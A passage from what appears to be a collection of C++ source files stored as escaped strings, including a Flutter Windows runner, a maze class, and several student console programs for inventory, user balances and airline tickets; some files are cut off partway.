option;\n\n\t\tswitch (option)\n\t\t{\n\t\tcase '1':\t\t\t\t\t\t\t\t\t\t\t\t\t//create Data base\n\t\t\tcout << \"Please enter number of Students (max \" << SIZE << \")\" << endl;\n\t\t\tcin >> n;\n\t\t\twhile (n > SIZE || n == 0) {\n\t\t\t\tcout << \"you have entered incorrect value\" << endl;\n\t\t\t\tcout << \"please enter value between 1 - 70\" << endl;\n\t\t\t\tcin >> n;\n\t\t\t}\n\t\t\tfor (i = 0; i < n; i++)\n\t\t\t{\n\t\t\t\tcout << \"student\" << i + 1 << endl;\n\t\t\t\tst[i].readDataBase();\n\n\t\t\t}\n\n\t\t\tbreak;\n\t\tcase '2':\t\t\t\t\t\t\t\t\t\t\t\t\t// append data\n\n\n\t\t\tst[n++].readDataBase();\n\n\n\t\t\tbreak;\n\t\tcase '3':\t\t\t\t\t\t\t\t\t\t\t\t\t// for searching\n\t\t{\n\t\t\tcout << \"enter roll no you want to search\" << endl;\n\t\t\tcin >> rolNo;\n\t\t\tbool flag = 0;\n\t\t\tfor (i = 0; i < n; i++)\n\t\t\t{\n\t\t\t\tfound = st[i].search(rolNo);\n\n\t\t\t\tif (found == true)\n\t\t\t\t{\n\t\t\t\t\tflag = 1;\n\t\t\t\t\tdisp();\n\t\t\t\t\tst[i].display();\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t}\n\t\t\tif (flag == 0) {\n\t\t\t\tcout << \"not found\";\n\t\t\t}\n\t\t\tsystem(\"pause\");\n\t\t\tsystem(\"cls\");\n\t\t\tbreak;\n\t\t}\n\t\tcase '4':\t//for",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bhagvat_geeta_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nclass User {\r\nprivate:\r\n    string username;\r\n    string password;\r\n    double sodu;\r\n\r\npublic:\r\n    User(string username, string password, double sodu) {\r\n        this->username = username;\r\n        this->password = password;\r\n        this->sodu = sodu;\r\n    }\r\n\r\n    string getUsername() {\r\n        return username;\r\n    }\r\n\r\n    bool checkPassword(string inputPassword) {\r\n        return password == inputPassword;\r\n    }\r\n\r\n    bool checkUserName(string inputUserName) {\r\n        return username == inputUserName;\r\n    }\r\n\r\n    double getSodu() {\r\n        return sodu;\r\n    }\r\n\r\n    void deductSodu(double amount) {\r\n        sodu -= amount;\r\n    }\r\n\r\n    bool changePassword() {\r\n        string oldPassword;\r\n        string newPassword;\r\n        cout << \"Enter old password: \";\r\n        cin >> oldPassword;\r\n        if (checkPassword(oldPassword)) {\r\n            cout << \"Enter new password: \";\r\n            cin >> newPassword;\r\n            password = newPassword;\r\n            cout << \"Password changed successfully.\" << endl;\r\n            return true; // Password changed successfully\r\n        } else {\r\n            cout << \"Incorrect old password. Please try again.\" << endl;\r\n            return false;\r\n        }\r\n    }\r\n    void displayBalance() {\r\n    int totalMinutes = sodu * 60; \r\n    int hours = totalMinutes / 60; \r\n    int minutes = totalMinutes % 60; \r\n    cout << \"Remaining account balance: \" << hours << \" hours and \" << minutes << \" minutes\" << endl;\r\n}\r\n    void addBalance(double minutes) {\r\n        double amount = minutes / 8.6; \r\n        if (amount > 50) {\r\n            double discount = amount * 0.15; \r\n            amount -= discount; \r\n        }\r\n        sodu += amount;\r\n        cout << \"Extra balance added successfully.\" << endl;\r\n    }\r\n\r\n    static User registerUser() {\r\n        string username, password;\r\n        double minutes, sodu;\r\n\r\n        cout << \"Register Account: \" << endl;\r\n        cout << \"Enter username: \";\r\n        cin >> username;\r\n        cout << \"Enter password: \";\r\n        cin >> password;\r\n        cout << \"Enter initial balance in minutes: \";\r\n        cin >> minutes;\r\n        sodu = minutes / 8.6;\r\n        if (sodu > 50) {\r\n            sodu -= (minutes / 8.6) * 0.15;\r\n        }\r\n        return User(username, password, sodu);\r\n    }\r\n\r\n    bool login() {\r\n        string inputUserName;\r\n        string inputPassword;\r\n        cout << \"Login Account: \" << endl;\r\n        cout << \"Enter your username: \";\r\n        cin >> inputUserName;\r\n        cout << \"Enter your password: \";\r\n        cin >> inputPassword;\r\n        return checkUserName(inputUserName) && checkPassword(inputPassword);\r\n    }\r\n};\r\n\r\nint main() {\r\n    User user1(\"default_user\", \"password\", 0.0);\r\n    int choice;\r\n    double extraBalance;\r\n\r\n    do {\r\n        cout << \"-----Menu CGT NET-----\" << endl;\r\n        cout << \"1. Register\" << endl;\r\n        cout << \"2. Login\" << endl;\r\n        cout << \"3. Change Password\" << endl;\r\n        cout << \"4. Show Balance\" << endl;\r\n        cout << \"5. Add Balance\" << endl;\r\n        cout << \"6. Exit\" << endl;\r\n        cout << \"-----Welcome-----\" << endl;\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                user1 = User::registerUser();\r\n                break;\r\n            case 2:\r\n                if (user1.login()) {\r\n                    cout << \"Login successful. Welcome, \" << user1.getUsername() << \"!\" << endl;\r\n                } else {\r\n                    cout << \"Login failed. Invalid username or password.\" << endl;\r\n                }\r\n                break;\r\n            case 3:\r\n                user1.changePassword();\r\n                break;\r\n            case 4:\r\n                user1.displayBalance();\r\n                break;\r\n            case 5:\r\n                cout << \"Enter extra balance to add: \";\r\n                cin >> extraBalance;\r\n                user1.addBalance(extraBalance);\r\n                break;\r\n            case 6:\r\n                cout << \"Exiting...\" << endl;\r\n                break;\r\n            default:\r\n                cout << \"Invalid choice. Please try again.\" << endl;\r\n                break;\r\n        }\r\n    } while (choice != 6);\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "/************************************************************************\n     File:        Maze.cpp\n\n     Author:     \n                  Stephen Chenney, schenney@cs.wisc.edu\n     Modifier\n                  Yu-Chi Lai, yu-chi@cs.wisc.edu\n\n     Comment:    \n\t\t\t\t\t\t(c) 2001-2002 Stephen Chenney, University of Wisconsin at Madison\n\n\t\t\t\t\t\tClass header file for Maze class. Manages the maze.\n\t\t\n\n     Platform:    Visio Studio.Net 2003 (converted to 2005)\n\n*************************************************************************/\n\n#include \"Maze.h\"\n#include \"MazeWindow.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n#include <string.h>\n#include <time.h>\n#include <FL/Fl.h>\n#include <FL/fl_draw.h>\n#include <GL/GL.h>\n#include \"LineSeg.h\"\n#include <iostream>\n\nusing namespace std;\n\nconst char Maze::X = 0;\nconst char Maze::Y = 1;\nconst char Maze::Z = 2;\n\nconst float Maze::BUFFER = 0.1f;\n\n\n//**********************************************************************\n//\n// * Constructor for the maze exception\n//======================================================================\nMazeException::\nMazeException(const char *m)\n//======================================================================\n{\n\tmessage = new char[strlen(m) + 4];\n\tstrcpy(message, m);\n}\n\n\n//**********************************************************************\n//\n// * Constructor to create the default maze\n//======================================================================\nMaze::\nMaze(const int nx, const int ny, const float sx, const float sy)\n//======================================================================\n{\n\t// Build the connectivity structure.\n\tBuild_Connectivity(nx, ny, sx, sy);\n\n\t// Make edges transparent to create a maze.\n\tBuild_Maze();\n\n\t// Set the extents of the maze\n\tSet_Extents();\n\n\t// Default values for the viewer.\n\tviewer_posn[X] = viewer_posn[Y] = viewer_posn[Z] = 0.0;\n\tviewer_dir = 0.0;\n\tviewer_fov = 45.0;\n\n\t// Always start on the 0th frame.\n\tframe_num = 0;\n}\n\n\n//**********************************************************************\n//\n// * Construtor to read in precreated maze\n//======================================================================\nMaze::\nMaze(const char *filename)\n//======================================================================\n{\n\tchar    err_string[128];\n\tFILE    *f;\n\tint\t    i;\n\n\t// Open the file\n\tif ( ! ( f = fopen(filename, \"r\") ) )\n\t\tthrow new MazeException(\"Maze: Couldn't open file\");\n\n\t// Get the total number of vertices\n\tif ( fscanf(f, \"%d\", &num_vertices) != 1 )\n\t\tthrow new MazeException(\"Maze: Couldn't read number of vertices\");\n\n\t// Read in each vertices\n\tvertices = new Vertex*[num_vertices];\n\tfor ( i = 0 ; i < num_vertices ; i++ ) {\n\t\tfloat x, y;\n\t\tif ( fscanf(f, \"%g %g\", &x, &y) != 2 )\t{\n\t\t\tsprintf(err_string, \"Maze: Couldn't read vertex number %d\", i);\n\t\t\tthrow new MazeException(err_string);\n\t\t}\n\t\tvertices[i] = new Vertex(i, x, y);\n\t}\n\n\t// Get the number of edges\n\tif ( fscanf(f, \"%d\", &num_edges) != 1 )\n\t\tthrow new MazeException(\"Maze: Couldn't read number of edges\");\n\n\t// read in all edges\n\tedges = new Edge*[num_edges];\n\tfor ( i = 0 ; i < num_edges ; i++ ){\n\t\tint     vs, ve, cl, cr, o;\n\t\tfloat\tr, g, b;\n\t\tif ( fscanf(f, \"%d %d %d %d %d %g %g %g\",\n\t\t\t\t\t\t&vs, &ve, &cl, &cr, &o, &r, &g, &b) != 8) {\n\t\t\tsprintf(err_string, \"Maze: Couldn't read edge number %d\", i);\n\t\t\tthrow new MazeException(err_string);\n\t\t}\n\t\tedges[i] = new Edge(i, vertices[vs], vertices[ve], r, g, b);\n\t\tedges[i]->Add_Cell((Cell*)cl, Edge::LEFT);\n\t\tedges[i]->Add_Cell((Cell*)cr, Edge::RIGHT);\n\t\tedges[i]->opaque = o ? true : false;\n\t}\n\n\t// Read in the number of cells\n\tif ( fscanf(f, \"%d\", &num_cells) != 1 )\n\t\tthrow new MazeException(\"Maze: Couldn't read number of cells\");\n\n\n\t// Read in all cells\n\tcells = new Cell*[num_cells];\n\tfor ( i = 0 ; i < num_cells ; i++ )\t{\n\t\tint epx, epy, emx, emy;\n\t\tif ( fscanf(f, \"%d %d %d %d\", &epx, &epy, &emx, &emy) != 4 ){\n\t\t\tsprintf(err_string, \"Maze: Couldn't read cell number %d\", i);\n\t\t\tthrow new MazeException(err_string);\n\t\t}\n\t\tcells[i] = new Cell(i, epx >= 0 ? edges[epx] : NULL,\n\t\t\t\t\t\t\t\t\tepy >= 0 ? edges[epy] : NULL,\n\t\t\t\t\t\t\t\t\temx >= 0 ? edges[emx] : NULL,\n\t\t\t\t\t\t\t\t\temy >= 0 ? edges[emy] : NULL);\n\t\tif ( cells[i]->edges[0] ) {\n\t\t\tif ( cells[i]->edges[0]->neighbors[0] == (Cell*)i )\n\t\t\t\tcells[i]->edges[0]->neighbors[0] = cells[i];\n\t\t\telse if ( cells[i]->edges[0]->neighbors[1] == (Cell*)i )\n\t\t\t\tcells[i]->edges[0]->neighbors[1] = cells[i];\n\t\t\telse\t{\n\t\t\t\tsprintf(err_string,\n\t\t\t\t\t\t  \"Maze: Cell %d not one of edge %d's neighbors\",\n\t\t\t\t\t\t\ti, cells[i]->edges[0]->index);\n\t\t\t\tthrow new MazeException(err_string);\n\t\t\t}\n\t\t}\n\n\t\tif ( cells[i]->edges[1] )\t{\n\t\t\tif ( cells[i]->edges[1]->neighbors[0] == (Cell*)i )\n\t\t\t\tcells[i]->edges[1]->neighbors[0] = cells[i];\n\t\t\telse if ( cells[i]->edges[1]->neighbors[1] == (Cell*)i )\n\t\t\t\tcells[i]->edges[1]->neighbors[1] = cells[i];\n\t\t\telse {\n\t\t\t\tsprintf(err_string,\n\t\t\t\t\t\t\t\"Maze: Cell %d not one of edge %d's neighbors\",\n\t\t\t\t\t\t\ti, cells[i]->edges[1]->index);\n\t\t\t\tthrow new",
    "#include<iostream>\n#include<string>\n#include <sstream>\n#include <bits/stdc++.h>\n#include<windows.h>\n#include\"queue1.h\"\n#include\"animation.h\"\n#include\"stackme.h\"\nusing namespace std;\n\nint search(int);\nint display();\nstring check(int);       \nfloat discount;\n\n////////////////////////////////////////////////////////////////////\nstruct node\n {\n\tint ID;\n\tstring proName;\n\tstring proBrand;\n\tdouble prePrice;\n\tint quantity;\n    struct    node* next;\n};\n\nstruct node *head=NULL;\n//////////////////////////////////////////////////////////////////////\n\tint search(int id)                     // it is of type int to get the pos of id\n {\t\t\t\t\t\t\t\t\t\t\t//furthur search() for id is used to delete product and modify if it is present in the first place\n \tint count=1;\n \tstruct node *p=head;\n \twhile(p!=NULL)\n \t{\n \t\tif(p->ID==id)\n \t\t\tbreak;\n \t\telse\n \t\t\tcount++;\n \t\t\tp=p->next;\n\t}\n \treturn count;\n }\n\n\n////////////////////////////////////////////////////////////////////////\n\nint display()\t\t\t\t//display() is of int type as serves two purposes displays the items in inventory and returns no. of nodes in list\n{\n\t\tsystem(\"cls\");\n\t\tint c=0;             //   c for count products\n\t\tstruct node *p=head;\n\t\tcout<<\"Existing products are:\\n\";\n\t\tcout<<\"ID\\t\\tProduct Name\\t\\tProduct Brand\\t\\tPrice\\t\\tQuantity\\n\";\n\t\tcout<<\"===============================================================================================|\\n\";\n\t\twhile(p!=NULL)\n\t\t{\n\t\t\tcout<<p->ID<<\"\\t\\t\"<<p->proName<<\"\\t\\t\\t\"<<p->proBrand<<\"\\t\\t\"<<p->prePrice<<\"\\t\\t\"<<check(p->quantity)<<\"\\n\"; \n\t\t\tp=p->next;\n\t\t\tc=c+1;\n\t\t}\n\t\tcout<<\"\\nTotal products in our store is : \"<<c<<\"\\n\\n\\n\";\n\t\treturn c;\n}\n////////////////////////////////////////////////////////////////////\nstring check(int quant)\t\t\t\t\t//to check whether required quantity is available or out of stock\n\t\t\t\t\t\t\t\t\t\t//checking of quantity is done not id\n\t{             \n\t    int a = quant;\n       stringstream ss;\n       ss << a;\n       string quantity = ss.str();\n\n\t    \tif(quant<=0)\n\t    \treturn \"out of stock!\";\n\t    \telse\n\t    \treturn quantity;\n\t\t}\n//////////////////////////////////////////////////////////////////\n void add()\n{\n\tsystem(\"cls\");\n\tint id,quant;           \n\tstring name, a_brand;\n\tdouble pre;            //  pre for price\n\tstruct node *t=new node;\n\tstruct node *p=head;\n\n\tcout<<\"\\t\\t\\tEnter product ID:-\";\n\tcin>>id;\n\tt->ID=id;\n\tcout<<\"\\t\\t\\tEnter product Name:-\";\n\tcin>>name;\n\tt->proName=name;\n\tcout<<\"\\t\\t\\tEnter product's Brand:-\";\n\tcin>>a_brand;\n\tt->proBrand=a_brand;\n\tcout<<\"\\t\\t\\tEnter product price:-\";\n\tcin>>pre;\n\tt->prePrice=pre;\n\tcout<<\"\\t\\t\\tEnter product quantity:-\";\n\tcin>>quant;\n\tt->quantity=quant;\n\tif(head==NULL)\n\t{\n\tt->next=head;\n\thead=t;\n\t}\n\telse\n\t{\n\t\twhile(p->next!=NULL)\n    {\n\t\tp=p->next;\n                        }\n        p->next=t;\n        t->next=NULL;\n\t\t\n\t}\t\n\tsystem(\"cls\");\n    cout<<\"\\n\\n\\t\\t\\t\\tThis product is Inserted!\\n\\n\\n\";\n\n\t}\n//////////////////////////////////////////////////////////////\n\tvoid discount_ack(){\n\tcout<<\"\\n\"<<discount<<\"% Discount will be applied\"<<endl;\n}\n/////////////////////////////////////////////////////////////\n\n\tvoid delPro()\n\t{\n\t\tsystem(\"cls\");\n\t\tdisplay();\n\t\tint id;\n\t\tstruct node *cur=head;\n\t\tstruct node *pre=head;\n\t\tcout<<\"\\n\\nEnter ID to delete that product:\\n\\n\";\n\t\tcin>>id;\n\t\t if (head == NULL)\n    {\n    \tsystem(\"cls\");\n        cout<<\"List is empty\"<<endl;\n    }\n\tint pos=0;\n\tint count=display();               //   for load no of nodes\n\tpos=search(id);                        //   for check weather desire node is exist or not\n\tif(pos<=count){\n\n\t\twhile(cur->ID!=id){                //  for delete middle area products\n\t\t\tpre=cur;\n\t\t\tcur=cur->next;\n}\n\t\tpre->next=cur->next;\n\t\tsystem(\"cls\");\n\t\tcout<<\"\\n<<item is deleted>>\\n\";\n\t}else{\n\t\tcout<<\"\\n<<<Not found>>\\n\\n\";\n\t}\n\t}\n\n//////////////////////////////////////////////////////////////////////////////////\n\tvoid modify()\n\t{\n\t\tint id;\n\t\tdouble pre;        //    pre for price\n\t\tstring pName, a_pBrand;\n\t\tint nid; int nq;     //   pName for new name\n\t\tif (head == NULL)\n    {\n    \tsystem(\"cls\");\n        cout<<\"List is empty\"<<endl;\n    }\n         else\n\t{    \n\t    display();\n\t\tcout<<\"\\n\\nEnter ID to modify product Name and its price:\\n\";\n\t\tcin>>id;\n\t\tstruct node *cur=head;\n\t\tint pos=0;\n\t\tint count=display();               //   for load no of nodes\n\t    pos=search(id);\n\t                            //   for check weather desire node is exist or not\n\t    if(pos<=count)\n    {\n\t\twhile(cur->ID!=id)\n        {\n\t\t\tcur=cur->next;\n\t\t}\n\t\tcout<<\"\\nOld ID : \"<<cur->ID<<endl;\n\t\tcout<<\"\\nOld Name : \"<<cur->proName<<endl;\n\t\tcout<<\"\\nOld Brand : \"<<cur->proBrand<<endl;\n\t\tcout<<\"\\nOld Price : \"<<cur->prePrice<<endl;\n\t\tcout<<\"\\nOld Quantity : \"<<cur->quantity<<endl;\n\n\t\tcout<<endl<<endl;\n\t\tcout<<\"Enter new ID:\";\n\t\tcin>>nid;\n\t\tcur->ID=nid;\n\t\tcout<<\"Enter new Name:\";\n\t\tcin>>pName;\n\t\tcur->proName=pName;\n\t\tcout<<\"Enter new Brand:\";\n\t\tcin>>a_pBrand;\n\t\tcur->proBrand=a_pBrand;\n\t\tcout<<\"Enter new Price:\";\n\t\tcin>>pre;\n\t\tcur->prePrice=pre;\n\t\tcout<<\"Enter new Quantity:\";\n\t\tcin>>nq;\n\t\tcu",
    "\ufeff#define _CRT_SECURE_NO_WARNINGS\n\n#include <iostream>\n#include <fstream>\nusing namespace std;\n\nvoid menu(); // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0446\u0438\u043a\u043b\u0438\u0447\u043d\u043e\u0433\u043e \u043c\u0435\u043d\u044e\nstruct BILET* user_input(BILET* bilet, int* count, ofstream &log); // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u0430 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u043c\nvoid read_and_print_bilets(BILET* bilet, int* count, ofstream& log); // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u043e\u0432 \u0438\u0437 \u043f\u0430\u043c\u044f\u0442\u0438\nvoid export_to_file(BILET* bilet, int* count, const char file_name[], ofstream& log); // \u042d\u043a\u043f\u043e\u0440\u0442\u0438\u0440\u0443\u0435\u043c \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u043e\u0432 \u0432 \u0444\u0430\u0439\u043b \u0438\u0437 \u043f\u0430\u043c\u044f\u0442\u0438\nstruct BILET* import_from_file(BILET* bilet, int* count, const char file_name[], ofstream& log); // \u0418\u043c\u043f\u043e\u0440\u0442\u0438\u0440\u0443\u0435\u043c \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u043e\u0432 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430 \u0432 \u043f\u0430\u043c\u044f\u0442\u044c\nchar** getlines(const char file_name[], int* len_text); // \u0427\u0438\u0442\u0430\u0435\u0442 \u0444\u0430\u0439\u043b \u043f\u043e\u0441\u0442\u0440\u043e\u0447\u043d\u043e \u0438 \u043a\u0430\u0436\u0434\u0443\u044e \u0441\u0442\u0440\u043e\u0447\u043a\u0443 \u0437\u0430\u043f\u0438\u0441\u044b\u0432\u0430\u0435\u0442 \u0432 \u043c\u0430\u0441\u0441\u0438\u0432\nstruct BILET* sorting(BILET* bilet, int* count); // \u041f\u0440\u043e\u0441\u0442\u0430\u044f \u043f\u0443\u0437\u044b\u0440\u044c\u043a\u043e\u0432\u0430\u044f \u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u043a\u0430 \u043f\u043e \u0434\u0430\u0442\u0435\nvoid bilet_near(BILET* bilet, int* count, ofstream& log); // \u041f\u043e\u0438\u0441\u043a \u0431\u043b\u0438\u0437\u0436\u0430\u0439\u0448\u0435\u0433\u043e \u0440\u0435\u0439\u0441\u0430\nvoid print_passenger_flight(BILET* bilet, int* count, ofstream& log); // \u0412\u044b\u0432\u043e\u0434 \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u043e\u0432 \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u0433\u043e \u0440\u0435\u0439\u0441\u0430\nvoid flight_airport(BILET* bilet, int* count, ofstream& log); // \u0412\u044b\u0432\u043e\u0434 \u0432\u0441\u0435\u0445 \u0440\u0435\u0439\u0441\u043e\u0432 \u043f\u0440\u0438\u043b\u0435\u0442\u0430\u044e\u0449\u0438\u0445 \u0438 \u0432\u044b\u043b\u0435\u0442\u0430\u044e\u0449\u0438\u0445 \u0438\u0437 \u0434\u0430\u043d\u043d\u043e\u0433\u043e \u0430\u044d\u0440\u043e\u043f\u043e\u0440\u0442\u0430\nint strlen(char* str); // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u044e\u0449\u0430\u044f \u0434\u043b\u0438\u043d\u0443 \u0441\u0442\u0440\u043e\u043a\u0438 (\u0434\u043e\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043a \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0430\u0441\u0441\u0430\u0436\u0438\u0440\u0430)\n\n\nstruct airport\n{\n    char city[36];\n    char code[4];\n};\n\nstruct company\n{\n    char eng[32];\n    char rus[32];\n};\n\nstruct BILET\n{\n    char surname1[32]; // \u0424\u0430\u043c\u0438\u043b\u0438\u044f\n    char name[32];\n    char surname2[32]; // \u041e\u0442\u0447\u0435\u0441\u0442\u0432\u043e\n    company company;\n    airport departure_airport;\n    airport arrival_airport;\n    unsigned int flight;\n    unsigned int date; // 2023 12 31\n    unsigned int time; // 23 59\n};\n\n#define airports_count 10\nairport airports[] = { {\"\u0422\u043e\u043c\u0441\u043a\", \"TOF\"}, {\"\u0418\u0440\u043a\u0443\u0442\u0441\u043a\", \"IKT\"}, {\"\u041a\u0440\u0430\u0441\u043d\u043e\u044f\u0440\u0441\u043a\",\"KJA\"}, {\"\u041d\u0438\u0436\u043d\u0438\u0439 \u041d\u043e\u0432\u0433\u043e\u0440\u043e\u0434\", \"GOJ\"}, {\"\u041d\u0438\u0436\u043d\u0435\u0432\u0430\u0440\u0442\u043e\u0432\u0441\u043a\", \"NJC\"},\n    {\"\u0421\u043e\u0447\u0438\", \"AER\"}, {\"\u0423\u043b\u0430\u043d-\u0423\u0434\u044d\", \"UUD\"}, {\"\u0423\u0444\u0430\", \"UFA\"}, {\"\u042f\u043a\u0443\u0442\u0441\u043a\", \"YKS\"}, {\"\u042e\u0436\u043d\u043e-\u0421\u0430\u0445\u0430\u043b\u0438\u043d\u0441\u043a\", \"UUS\"}};\n\n#define company_count 5\ncompany companys[] = { {\"Aeroflot\", \"\u0410\u044d\u0440\u043e\u0444\u043b\u043e\u0442\"}, {\"Aurora\", \"\u0410\u0432\u0440\u043e\u0440\u0430\"}, {\"Red Wings\", \"\u0420\u0435\u0434 \u0412\u0438\u043d\u0433\u0441\"}, {\"Rossiya\", \"\u0420\u043e\u0441\u0441\u0438\u044f\"}, {\"S7 Airlanes\", \"\u0421\u0438\u0431\u0438\u0440\u044c\"} };\n\nint main()\n{\n    setlocale(LC_ALL, \"RUS\");\n    menu();\n}\n\nvoid menu()\n{\n    int* count = new int{ 0 }; // \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0431\u0438\u043b\u0435\u0442\u043e\u0432 \u0432 \u043f\u0430\u043c\u044f\u0442\u0438\n    struct BILET* bilet = (BILET*)malloc(*count * sizeof(BILET)); // 